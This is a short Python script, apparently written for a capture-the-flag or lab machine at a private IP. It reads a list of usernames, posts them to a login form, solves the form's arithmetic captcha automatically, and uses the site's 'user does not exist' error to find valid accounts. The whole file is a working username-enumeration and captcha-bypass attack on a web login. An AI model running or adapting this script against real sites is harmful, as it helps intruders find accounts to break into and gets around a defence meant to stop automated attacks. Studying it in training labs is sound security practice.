import re
import operator
import requests
from html import unescape

URL = "http://10.129.141.5/login"

session = requests.Session()

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
}

ops = {
    "+": operator.add,
    "-": operator.sub,
    "*": operator.mul,
    "/": operator.floordiv,
}

with open("usernames.txt") as f:
    for username in map(str.strip, f):

        # First POST to receive the current challenge
        r = session.post(
            URL,
            headers=headers,
            data={
                "username": username,
                "password": "password",
                "captcha": "0"      # intentionally wrong
            }
        )

        # Decode HTML entities
        page = unescape(r.text)

        # Skip usernames that don't exist
        if re.search(r"The user\s+'[^']+'\s+does not exist", page):
            continue

        # Extract the captcha equation
        m = re.search(r'(\d+)\s*([+\-*/])\s*(\d+)\s*=', page)
        if not m:
            print(f"[!] Couldn't find captcha for {username}")
            continue

        a = int(m.group(1))
        op = m.group(2)
        b = int(m.group(3))
        captcha = str(ops[op](a, b))

        # Second POST with the solved captcha
        r = session.post(
            URL,
            headers=headers,
            data={
                "username": username,
                "password": "password",
                "captcha": captcha
            }
        )

        page = unescape(r.text)

        print(f"{username} -> {r.status_code}")

        # Skip usernames that don't exist
        if re.search(r"The user\s+'[^']+'\s+does not exist", page):
            continue

        # Anything else is interesting
        print(f"[+] Possible hit: {username}")
        print(page)
        break